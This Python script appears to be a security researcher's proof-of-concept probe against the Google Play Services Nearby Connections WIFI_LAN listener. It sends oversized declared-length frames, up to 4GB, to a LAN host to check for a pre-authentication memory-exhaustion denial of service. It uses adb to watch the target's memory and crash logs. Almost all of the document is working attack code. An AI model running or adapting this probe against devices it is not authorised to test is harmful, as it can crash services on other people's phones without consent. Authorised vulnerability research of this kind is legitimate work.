#!/usr/bin/env python3
"""
Nearby Connections WIFI_LAN listener (GMS, Tier 1).
- Reachable from an arbitrary host on the LAN: NO app install, NO user interaction.
- Wire format observed: 4-byte big-endian length prefix, then payload.
- Our probe b"\\r\\n\\r\\n" was read as length 0x0D0D0A0A = 218,762,506.

Test: does the server allocate/buffer the declared length BEFORE authentication?
If so this is a remote pre-auth memory-exhaustion DoS against Google Play Services.
"""
import socket
import struct
import subprocess
import sys
import time

HOST = "192.168.1.34"


def sh(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=90)


def gms_pid():
    for p in sh("adb shell 'ps -A -o PID,NAME 2>/dev/null | grep -i gms'").stdout.splitlines():
        parts = p.split()
        if parts:
            return parts[0]
    return None


def meminfo(pid):
    out = sh(f"adb shell dumpsys meminfo {pid} 2>/dev/null").stdout
    tot = ps = ""
    for l in out.splitlines():
        if "TOTAL PSS" in l:
            tot = l.strip()
        if "Native Heap" in l:
            ps = l.strip()
    return tot, ps


def probe_len(length, payload=b"", label="", hold=6.0, chunk_delay=0.0):
    pid = gms_pid()
    before_tot, before_heap = meminfo(pid)
    sh("adb logcat -c")
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except Exception as e:
        return dict(label=label, connect=f"FAIL {e}")
    s.settimeout(hold)
    res = {}
    try:
        s.sendall(struct.pack(">I", length))
        if payload:
            s.sendall(payload)
        # hold the connection open and see if the server buffers
        time.sleep(hold)
        try:
            data = s.recv(4096)
            res["reply"] = data[:200].hex()
        except socket.timeout:
            res["reply"] = "<no reply>"
        except Exception as e:
            res["reply"] = f"<err {e}>"
    except Exception as e:
        res["send_err"] = str(e)
    finally:
        try:
            s.close()
        except Exception:
            pass
    time.sleep(2)
    after_tot, after_heap = meminfo(pid)
    log = sh("adb logcat -d -v time").stdout
    rel = [l for l in log.splitlines()
           if any(k in l for k in ("Nearby", "nearby", "MultiplexSocket", "BlockingQueueStream",
                                   "OutOfMemory", "lowmemorykiller", "low memory", "ANR",
                                   "FATAL", "Process: com.google.android.gms"))]
    return dict(label=label, length=length, pid=pid, before=before_tot, after=after_tot,
                reply=res.get("reply"), send_err=res.get("send_err"), log=rel[:14])


if __name__ == "__main__":
    PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 51692
    print(f"### Nearby WIFI_LAN listener on {HOST}:{PORT}\n")
    cases = [
        (4, b"AAAA", "tiny-4"),
        (218762506, b"", "observed-218MB"),
        (0x7FFFFFFF, b"", "max-int-2GB"),
        (0xFFFFFFFF, b"", "uint-max-4GB"),
        (0x40000000, b"", "1GB"),
    ]
    for length, payload, label in cases:
        r = probe_len(length, payload, label)
        print(f"--- {label}: declared length={length} (0x{length:x})")
        if "connect" in r:
            print("     ", r["connect"])
            continue
        print(f"     pid={r['pid']} reply={r['reply']} err={r.get('send_err')}")
        print(f"     PSS before: {r['before']}")
        print(f"     PSS after : {r['after']}")
        for l in r["log"]:
            print("     ~ " + l[:210])
        print()